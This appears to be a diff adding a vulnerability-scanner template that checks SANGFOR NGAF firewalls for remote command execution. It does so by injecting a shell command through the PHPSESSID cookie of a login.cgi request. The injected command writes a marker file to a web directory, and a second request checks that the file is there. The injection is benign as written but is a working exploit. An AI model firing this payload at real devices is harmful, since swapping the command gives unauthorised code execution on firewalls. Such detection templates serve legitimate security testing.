@@ -1,0 +1,54 @@
+id: poc-sangfor-ngaf-svpn-rce
+
+info:
+  name: SANGFOR NGAF Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,firewall
+  description: |
+    This template detects a remote command execution vulnerability in SANGFOR NGAF login functionality by exploiting an improperly sanitized input in the login request.
+
+variables:
+  randBody: "{{rand_text_alphanumeric(32)}}"
+  randName: "{{rand_text_alphanumeric(8)}}"
+
+flow: |-
+  http(1) && http(2)
+
+http:
+  - id: rce-login-test
+    method: POST
+    path:
+      - "{{BaseURL}}/cgi-bin/login.cgi"
+    headers:
+      Content-Type: Application/X-www-Form
+      Cookie: "PHPSESSID=`$(echo \"{{randBody}}\"~ > /fwlib/sys/virus/webui/svpn_html/{{randName}}.txt)`"
+      y-forwarded-for: 127.0.0.1
+    body: |
+      {"opr":"login", "data":{"user": "watchTowr" , "pwd": "watchTowr" , "vericode": "EINW" , "privacy_enable": "0"}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "success"
+          - "msg"
+
+  - id: rce-file-check
+    method: GET
+    path:
+      - "{{BaseURL}}/svpn_html/{{randName}}.txt"
+    headers:
+      y-forwarded-for: 127.0.0.1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{randBody}}"
